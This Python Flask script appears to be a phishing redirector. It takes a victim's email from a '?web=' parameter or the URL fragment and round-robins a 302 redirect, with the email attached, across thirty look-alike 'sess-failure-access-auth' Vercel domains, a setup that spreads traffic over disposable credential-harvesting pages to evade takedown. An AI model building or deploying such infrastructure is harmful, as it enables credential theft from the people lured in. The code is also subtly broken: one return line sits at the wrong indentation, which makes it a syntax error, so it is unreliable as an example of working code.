from flask import Flask, redirect, request, render_template_string
import os

app = Flask(__name__)
application = app

DOMAINS = [
    'https://sess-failure-access-auth.vercel.app',
    'https://sess-failure-access-auth-mu.vercel.app',
    'https://sess-failure-access-auth-nine.vercel.app',
    'https://sess-failure-access-auth-mcw2.vercel.app',
    'https://sess-failure-access-auth-p3gx.vercel.app',
    'https://sess-failure-access-auth-acrv.vercel.app',
    'https://sess-failure-access-auth-mnbx.vercel.app',
    'https://sess-failure-access-auth-32v8.vercel.app',
    'https://sess-failure-access-auth-b7m7.vercel.app',
    'https://sess-failure-access-auth-lmn4.vercel.app',
    'https://sess-failure-access-auth-4gzy.vercel.app',
    'https://sess-failure-access-auth-3ce5.vercel.app',
    'https://sess-failure-access-auth-bb9j.vercel.app',
    'https://sess-failure-access-auth-ttq5.vercel.app',
    'https://sess-failure-access-auth-9tfq.vercel.app',
    'https://sess-failure-access-auth-x1fd.vercel.app',
    'https://sess-failure-access-auth-atu4.vercel.app',
    'https://sess-failure-access-auth-yo3n.vercel.app',
    'https://sess-failure-access-auth-6mvs.vercel.app',
    'https://sess-failure-access-auth-kcgh.vercel.app',
    'https://sess-failure-access-auth-92ek.vercel.app',
    'https://sess-failure-access-auth-6j41.vercel.app',
    'https://sess-failure-access-auth-ca84.vercel.app',
    'https://sess-failure-access-auth-i46e.vercel.app',
    'https://sess-failure-access-auth-f1y3.vercel.app',
    'https://sess-failure-access-auth-7e4d.vercel.app',
    'https://sess-failure-access-auth-jlhd.vercel.app',
    'https://sess-failure-access-auth-njph.vercel.app',
    'https://sess-failure-access-auth-sa27.vercel.app',
    'https://sess-failure-access-auth-nmpw.vercel.app'   
]

# Initialize counter
current_index = 0

@app.route('/')
def round_robin_balancer():
    global current_index
    
    # Try to get email from query parameter first (?web=email@email.com)
    email = request.args.get('web', '')
    
    # If no query parameter, serve a page that can handle the fragment
    if not email:
    return render_template_string('''
        <div id="status"></div>
        <script>
            const status = document.getElementById('status');
    
            if (window.location.hash) {
                let email = window.location.hash.substring(1);
                window.location.href = '/?web=' + encodeURIComponent(email);
            } else {
                status.innerText = 'Invalid email';
            }
        </script>
    ''')

    
    # Basic email validation
    if not email or '@' not in email or '.' not in email:
        return "Invalid email.", 400
    
    # Get next domain in round-robin sequence
    target_domain = DOMAINS[current_index]
    
    # Increment index for next request
    current_index = (current_index + 1) % len(DOMAINS)
    
    # Construct target URL with the required ?web= parameter format
    target_url = f"{target_domain}/?web={email}"
    
    # Instant redirect
    return redirect(target_url, code=302)

if __name__ == '__main__':
    app.run(debug=True)